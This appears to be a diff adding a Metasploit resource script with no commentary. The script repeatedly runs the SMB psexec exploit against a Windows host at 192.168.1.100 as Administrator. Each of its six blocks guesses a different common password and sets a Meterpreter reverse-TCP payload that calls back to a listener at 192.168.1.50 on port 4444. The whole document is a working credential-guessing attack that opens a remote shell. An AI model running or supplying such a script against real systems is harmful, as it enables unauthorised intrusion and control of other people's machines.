@@ -1,0 +1,48 @@
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass 123456
+set RHOST 192.168.1.100
+set payload windows/meterpreter/reverse_tcp
+set LPORT 4444
+set LHOST 192.168.1.50
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass admin123
+set RHOST 192.168.1.100
+set payload windows/meterpreter/reverse_tcp
+set LPORT 4444
+set LHOST 192.168.1.50
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass password123
+set RHOST 192.168.1.100
+set payload windows/meterpreter/reverse_tcp
+set LPORT 4444
+set LHOST 192.168.1.50
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass admin
+set RHOST 192.168.1.100
+set payload windows/meterpreter/reverse_tcp
+set LPORT 4444
+set LHOST 192.168.1.50
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass letmein
+set RHOST 192.168.1.100
+set payload windows/meterpreter/reverse_tcp
+set LPORT 4444
+set LHOST 192.168.1.50
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass 0000
+set RHOST 192.168.1.100
+set payload windows/meterpreter/reverse_tcp
+set LPORT 4444
+set LHOST 192.168.1.50
+exploit -j -z
